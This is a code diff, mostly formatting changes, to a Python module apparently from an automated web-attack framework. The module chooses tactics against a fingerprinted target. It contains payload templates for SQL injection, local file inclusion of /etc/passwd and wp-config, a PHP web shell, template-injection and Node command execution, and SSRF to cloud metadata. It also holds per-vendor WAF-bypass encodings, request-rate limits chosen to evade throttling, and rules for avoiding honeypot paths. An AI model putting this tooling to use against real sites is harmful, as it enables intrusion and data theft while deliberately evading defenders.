@@ -51,19 +51,19 @@ from __future__ import annotations
 from dataclasses import dataclass, field
 from typing import Dict, List, Optional
 
-
 # ── Data model ────────────────────────────────────────────────────
 
 
 @dataclass
 class TacticSpec:
     """Per-class attack tactic, tuned to observed architecture."""
-    tactic_class: str                 # "sqli", "xss", "lfi", "rce", "ssrf", "csrf", ...
+
+    tactic_class: str  # "sqli", "xss", "lfi", "rce", "ssrf", "csrf", ...
     payload_templates: List[str] = field(default_factory=list)
-    encoders: List[str] = field(default_factory=list)    # names from evasion.encode
+    encoders: List[str] = field(default_factory=list)  # names from evasion.encode
     min_delay_ms: int = 500
     max_delay_ms: int = 2500
-    confidence_note: str = ""         # why this tactic was picked for this stack
+    confidence_note: str = ""  # why this tactic was picked for this stack
 
 
 @dataclass
@@ -72,31 +72,31 @@ class AdaptedStrategy:
     probe_order: List[str] = field(default_factory=list)
     per_class: Dict[str, TacticSpec] = field(default_factory=dict)
     encoding_cascade: List[str] = field(default_factory=list)
-    rps_ceiling: float = 12.0         # requests per minute
+    rps_ceiling: float = 12.0  # requests per minute
     origin_bypass: bool = False
     avoid_paths: List[str] = field(default_factory=list)
     notes: List[str] = field(default_factory=list)
 
     def to_dict(self) -> dict:
         return {
-            "profile_target":    self.profile_target,
-            "probe_order":       self.probe_order,
+            "profile_target": self.profile_target,
+            "probe_order": self.probe_order,
             "per_class": {
                 k: {
-                    "tactic_class":      v.tactic_class,
+                    "tactic_class": v.tactic_class,
                     "payload_templates": v.payload_templates,
-                    "encoders":          v.encoders,
-                    "min_delay_ms":      v.min_delay_ms,
-                    "max_delay_ms":      v.max_delay_ms,
-                    "confidence_note":   v.confidence_note,
+                    "encoders": v.encoders,
+                    "min_delay_ms": v.min_delay_ms,
+                    "max_delay_ms": v.max_delay_ms,
+                    "confidence_note": v.confidence_note,
                 }
                 for k, v in self.per_class.items()
             },
             "encoding_cascade": self.encoding_cascade,
-            "rps_ceiling":      self.rps_ceiling,
-            "origin_bypass":    self.origin_bypass,
-            "avoid_paths":      self.avoid_paths,
-            "notes":            self.notes,
+            "rps_ceiling": self.rps_ceiling,
+            "origin_bypass": self.origin_bypass,
+            "avoid_paths": self.avoid_paths,
+            "notes": self.notes,
         }
 
 
@@ -106,13 +106,13 @@ class AdaptedStrategy:
 # Wordfence's own rule changelog, and the community WAF-Bypass wiki.
 
 _WAF_CASCADES = {
-    "cloudflare":    ["url", "case_mutate", "url2", "sql_keyword_obfuscate"],
-    "wordfence":     ["comment_pad", "utf8_overlong", "case_mutate", "url"],
-    "sucuri":        ["hpp", "url", "html_entity"],
-    "akamai":        ["utf8_overlong", "case_mutate", "url2"],
-    "aws_waf":       ["hpp", "case_mutate", "url", "hex_escape"],
-    "imperva":       ["comment_pad", "case_mutate", "url2"],
-    "modsecurity":   ["case_mutate", "comment_pad", "sql_keyword_obfuscate"],
+    "cloudflare": ["url", "case_mutate", "url2", "sql_keyword_obfuscate"],
+    "wordfence": ["comment_pad", "utf8_overlong", "case_mutate", "url"],
+    "sucuri": ["hpp", "url", "html_entity"],
+    "akamai": ["utf8_overlong", "case_mutate", "url2"],
+    "aws_waf": ["hpp", "case_mutate", "url", "hex_escape"],
+    "imperva": ["comment_pad", "case_mutate", "url2"],
+    "modsecurity": ["case_mutate", "comment_pad", "sql_keyword_obfuscate"],
 }
 _DEFAULT_CASCADE = ["url", "case_mutate"]
 
@@ -123,11 +123,11 @@ _DEFAULT_CASCADE = ["url", "case_mutate"]
 # Using the wrong dialect burns the request.
 
 _SLEEP_BY_DB = {
-    "mysql":    ["SLEEP(5)", "BENCHMARK(5000000,MD5('x'))"],
-    "mariadb":  ["SLEEP(5)", "BENCHMARK(5000000,MD5('x'))"],
+    "mysql": ["SLEEP(5)", "BENCHMARK(5000000,MD5('x'))"],
+    "mariadb": ["SLEEP(5)", "BENCHMARK(5000000,MD5('x'))"],
     "postgres": ["pg_sleep(5)", "(SELECT pg_sleep(5))"],
-    "mssql":    ["WAITFOR DELAY '0:0:5'"],
-    "sqlite":   ["randomblob(100000000)"],
+    "mssql": ["WAITFOR DELAY '0:0:5'"],
+    "sqlite": ["randomblob(100000000)"],
 }
 _DEFAULT_SLEEP = ["SLEEP(5)"]
 
@@ -135,7 +135,7 @@ _DEFAULT_SLEEP = ["SLEEP(5)"]
 # ── OS-family LFI payload switches ────────────────────────────────
 
 _LFI_BY_OS = {
-    "linux":   [
+    "linux": [
         "../../../../etc/passwd",
         "/etc/passwd",
         "php://filter/convert.base64-encode/resource=wp-config",
@@ -163,12 +163,14 @@ _XSS_BASE = [
 # ── Runtime-aware RCE / POI gadgets ───────────────────────────────
 
 _RCE_TEMPLATES = {
-    "php":     [
-        "O:8:\"stdClass\":0:{}",                                  # minimal POI canary
-        "<?php system($_GET['c']); ?>",                           # upload-then-execute
+    "php": [
+        'O:8:"stdClass":0:{}',  # minimal POI canary
+        "<?php system($_GET['c']); ?>",  # upload-then-execute
     ],
-    "python":  ["{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"],  # SSTI-jinja
-    "node":    ["require('child_process').execSync('id').toString()"],
+    "python": [
+        "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
+    ],  # SSTI-jinja
+    "node": ["require('child_process').execSync('id').toString()"],
 }
 
 
@@ -187,21 +189,30 @@ _WP_PROBE_ORDER = [
 ]
 
 _GENERIC_PROBE_ORDER = [
-    "sqli", "lfi", "xss", "ssrf", "rce", "csrf",
+    "sqli",
+    "lfi",
+    "xss",
+    "ssrf",
+    "rce",
+    "csrf",
 ]
 
 
 # ── The core decision function ────────────────────────────────────
 
 
-def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime import to avoid cycle)
+def pick_strategy(
+    profile,
+) -> AdaptedStrategy:  # ArchitectureProfile (runtime import to avoid cycle)
     """Build an AdaptedStrategy from an ArchitectureProfile.
 
     Pure function — no I/O. `profile` may be an ArchitectureProfile
     or any object exposing the same attributes, which lets callers
     synthesize strategies from partial knowledge in tests.
     """
-    target = getattr(profile, "target_url", "") or getattr(profile, "target_host", "<unknown>")
+    target = getattr(profile, "target_url", "") or getattr(
+        profile, "target_host", "<unknown>"
+    )
 
     strategy = AdaptedStrategy(profile_target=target)
 
@@ -215,7 +226,8 @@ def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime i
                 cascade = list(cas)
                 picked_waf = known
                 strategy.notes.append(
-                    f"WAF fingerprint={known}; cascade tuned to published bypasses")
+                    f"WAF fingerprint={known}; cascade tuned to published bypasses"
+                )
                 break
         if cascade:
             break
@@ -223,7 +235,8 @@ def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime i
         cascade = list(_DEFAULT_CASCADE)
         if waf_names:
             strategy.notes.append(
-                f"WAF family {waf_names} unfamiliar — using conservative cascade")
+                f"WAF family {waf_names} unfamiliar — using conservative cascade"
+            )
         else:
             strategy.notes.append("No WAF fingerprint — minimal cascade")
     strategy.encoding_cascade = cascade
@@ -233,20 +246,17 @@ def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime i
     if cdn in ("cloudflare", "sucuri", "akamai", "fastly", "cloudfront"):
         strategy.origin_bypass = True
         strategy.notes.append(
-            f"Edge={cdn} — run adapt.origin first; skip heavy probes until origin resolved")
+            f"Edge={cdn} — run adapt.origin first; skip heavy probes until origin resolved"
+        )
 
     # 3. Database-aware SQLi payloads -----------------------------------
     db = (getattr(profile, "database", None) or "").lower()
     sleep_primitives = _SLEEP_BY_DB.get(db, _DEFAULT_SLEEP)
     strategy.per_class["sqli"] = TacticSpec(
         tactic_class="sqli",
-        payload_templates=[
-            f"' AND {p}-- -" for p in sleep_primitives
-        ] + [
-            f"\" AND {p}-- -" for p in sleep_primitives
-        ] + [
-            f") AND {p}-- -" for p in sleep_primitives
-        ],
+        payload_templates=[f"' AND {p}-- -" for p in sleep_primitives]
+        + [f'" AND {p}-- -' for p in sleep_primitives]
+        + [f") AND {p}-- -" for p in sleep_primitives],
         encoders=cascade,
         min_delay_ms=800,
         max_delay_ms=3500,
@@ -269,7 +279,9 @@ def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime i
     strategy.per_class["xss"] = TacticSpec(
         tactic_class="xss",
         payload_templates=list(_XSS_BASE),
-        encoders=[e for e in cascade if e != "sql_keyword_obfuscate"],  # SQL-only encoder irrelevant
+        encoders=[
+            e for e in cascade if e != "sql_keyword_obfuscate"
+        ],  # SQL-only encoder irrelevant
         min_delay_ms=400,
         max_delay_ms=1800,
         confidence_note="HTML injection set; refine after CSP discovery",
@@ -294,9 +306,12 @@ def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime i
     # 7. CSRF / REST authz / file upload / SSRF --------------------------
     strategy.per_class["csrf"] = TacticSpec(
         tactic_class="csrf",
-        payload_templates=["<form method=POST action='{endpoint}'>... no nonce ...</form>"],
+        payload_templates=[
+            "<form method=POST action='{endpoint}'>... no nonce ...</form>"
+        ],
         encoders=[],
-        min_delay_ms=600, max_delay_ms=1500,
+        min_delay_ms=600,
+        max_delay_ms=1500,
         confidence_note="issues one cross-origin POST; no encoding needed",
     )
     strategy.per_class["rest_authz"] = TacticSpec(
@@ -305,7 +320,8 @@ def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime i
             "/wp-json/{namespace}/{route}",  # unauth path probe
         ],
         encoders=[],
-        min_delay_ms=400, max_delay_ms=1200,
+        min_delay_ms=400,
+        max_delay_ms=1200,
         confidence_note="unauthed REST probe — one shot per namespace",
     )
     strategy.per_class["file_upload"] = TacticSpec(
@@ -317,7 +333,8 @@ def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime i
             "shell.php%00.jpg",
         ],
         encoders=[],
-        min_delay_ms=700, max_delay_ms=2500,
+        min_delay_ms=700,
+        max_delay_ms=2500,
         confidence_note="polyglot images + double-extension bypass",
     )
     strategy.per_class["ssrf"] = TacticSpec(
@@ -329,33 +346,41 @@ def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime i
             "file:///etc/passwd",
         ],
         encoders=cascade,
-        min_delay_ms=1000, max_delay_ms=3000,
+        min_delay_ms=1000,
+        max_delay_ms=3000,
         confidence_note="cloud metadata + Redis + gopher + file://",
     )
     strategy.per_class["poi"] = TacticSpec(
         tactic_class="poi",
-        payload_templates=["O:8:\"stdClass\":0:{}"],
+        payload_templates=['O:8:"stdClass":0:{}'],
         encoders=["url"],
-        min_delay_ms=600, max_delay_ms=2000,
+        min_delay_ms=600,
+        max_delay_ms=2000,
         confidence_note="canary stdClass probe — confirms unserialize before chain build",
     )
 
     # 8. Probe order — framework-aware -----------------------------------
     fw = (getattr(profile, "framework", None) or "").lower()
-    strategy.probe_order = list(_WP_PROBE_ORDER) if "wordpress" in fw else list(_GENERIC_PROBE_ORDER)
+    strategy.probe_order = (
+        list(_WP_PROBE_ORDER) if "wordpress" in fw else list(_GENERIC_PROBE_ORDER)
+    )
 
     # 9. Timing ceiling — WAF-aware --------------------------------------
     if picked_waf == "wordfence":
-        strategy.rps_ceiling = 8.0   # below WF live-throttle (~30/min, further margin)
+        strategy.rps_ceiling = 8.0  # below WF live-throttle (~30/min, further margin)
         strategy.notes.append("Wordfence: holding ≤8 req/min to dodge live throttle")
     elif picked_waf in ("cloudflare", "akamai"):
         strategy.rps_ceiling = 20.0
-        strategy.notes.append(f"{picked_waf}: bursty tolerance higher; 20 req/min ceiling")
+        strategy.notes.append(
+            f"{picked_waf}: bursty tolerance higher; 20 req/min ceiling"
+        )
     elif picked_waf:
         strategy.rps_ceiling = 12.0
     else:
         strategy.rps_ceiling = 30.0
-        strategy.notes.append("No WAF detected — 30 req/min ceiling for politeness not evasion")
+        strategy.notes.append(
+            "No WAF detected — 30 req/min ceiling for politeness not evasion"
+        )
 
     # 10. Avoid paths — honeypot-style endpoints ------------------------
     #   Wordfence maintains honey paths; tripping them flags the session.
@@ -367,9 +392,12 @@ def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime i
         ]
 
     # 11. Debug-mode gifts ----------------------------------------------
-    if getattr(profile, "debug_mode", False) or getattr(profile, "verbose_errors", False):
+    if getattr(profile, "debug_mode", False) or getattr(
+        profile, "verbose_errors", False
+    ):
         strategy.notes.append(
-            "Target leaks stack traces — exploit error-based SQLi / template-engine probes first")
+            "Target leaks stack traces — exploit error-based SQLi / template-engine probes first"
+        )
         if "sqli" in strategy.per_class:
             # Error-based SQLi is faster than blind-timing when verbose errors are on.
             eb = [
@@ -377,7 +405,9 @@ def pick_strategy(profile) -> AdaptedStrategy:  # ArchitectureProfile (runtime i
                 "' AND extractvalue(1,concat(0x7e,@@version))-- -",
                 "') AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)-- -",
             ]
-            strategy.per_class["sqli"].payload_templates = eb + strategy.per_class["sqli"].payload_templates
+            strategy.per_class["sqli"].payload_templates = (
+                eb + strategy.per_class["sqli"].payload_templates
+            )
             strategy.per_class["sqli"].confidence_note += "; error-based prioritized"
 
     return strategy
